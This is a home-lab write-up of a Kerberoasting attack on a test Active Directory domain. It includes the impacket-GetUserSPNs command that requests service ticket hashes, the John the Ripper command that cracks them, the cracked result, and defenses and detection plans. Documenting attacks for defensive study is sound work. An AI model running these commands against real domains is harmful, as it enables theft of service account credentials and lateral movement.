# Kerberoasting Attack - Complete Execution

## What is Kerberoasting?
Kerberoasting is an Active Directory attack technique (MITRE ATT&CK T1558.003) where an attacker requests Kerberos service tickets for service accounts, then cracks them offline to reveal plaintext passwords.

## Attack Requirements
- Valid domain user credentials (any domain user, not admin)
- Service account with an SPN (Service Principal Name) registered
- Offline password cracking tool (hashcat/John the Ripper)

## Lab Setup for This Attack
- Attacker machine: Kali Linux (192.168.56.30)
- Target: AD-DomainController (192.168.56.10) - lab.local domain
- Vulnerable account: svc-sql (MSSQLSvc/lab.local:1433)
- Weak password: Password123 (intentionally weak to demonstrate cracking)

## Attack Steps

### 1. Discovered Kerberoastable Accounts
Used Impacket's GetUserSPNs to find service accounts with SPNs:
```bash
impacket-GetUserSPNs lab.local/Administrator:Password -dc-ip 192.168.56.10 -request -outputfile hash.txt
```
Result: Found svc-sql with SPN MSSQLSvc/lab.local:1433

### 2. Captured Kerberos Ticket Hash
- Hash type: krb5tgs (Kerberos 5 TGS etype 23)
- Hash saved to: hash.txt
- Format: `$krb5tgs$23$*svc-sql$LAB.LOCAL$lab.local/svc-sql*$...`

### 3. Cracked Hash Offline
Used John the Ripper with rockyou.txt wordlist:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Result: Password cracked in under 1 second
Cracked password: Password123

## Why This Works
- Service accounts often have weak, never-rotated passwords
- Any authenticated domain user can request Kerberos tickets
- Cracking happens OFFLINE - no failed login attempts, no alerts triggered
- Common passwords appear in rockyou.txt (14 million real leaked passwords)

## MITRE ATT&CK Mapping
- Technique: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
- Tactic: Credential Access
- Tool used: Impacket GetUserSPNs, John the Ripper

## Real World Impact
If this were a real company:
- Attacker now has valid svc-sql credentials
- Can access SQL Server databases
- Can move laterally to other systems
- Can escalate privileges toward Domain Admin

## Defenses Against Kerberoasting
- Use strong, random passwords for service accounts (20+ characters)
- Use Group Managed Service Accounts (gMSAs) - auto-rotate passwords
- Monitor Event ID 4769 (Kerberos Service Ticket Request) for anomalies
- Limit service accounts to minimum required privileges

## Next Steps
- Set up Splunk Universal Forwarder on Domain Controller
- Forward Windows Security logs to Splunk
- Write detection query for Event ID 4769 (Kerberoasting indicator)
- Verify alert fires when attack is repeated

